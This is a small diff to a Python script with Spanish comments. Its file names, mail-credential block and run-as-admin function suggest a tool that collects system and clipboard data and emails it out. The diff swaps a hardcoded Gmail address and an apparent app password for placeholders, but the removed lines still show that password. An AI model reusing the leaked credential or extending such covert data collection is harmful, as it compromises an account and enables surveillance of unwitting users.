@@ -24,9 +24,9 @@ system_information = os.path.join(current_directory, "systeminfo.txt")
 clipboard_information = os.path.join(current_directory, "clipboard.txt")
 
 #credenciales del mail
-email_address = 'classeprueba1234@gmail.com'
-password = 'lgal hrtr ufpw stld'
-toaddr = "classeprueba1234@gmail.com"
+email_address = 'mail'
+password = 'passwd'
+toaddr = "mail"
 
 #Funcion para ejecutar el script como administrador
 def run_as_admin():
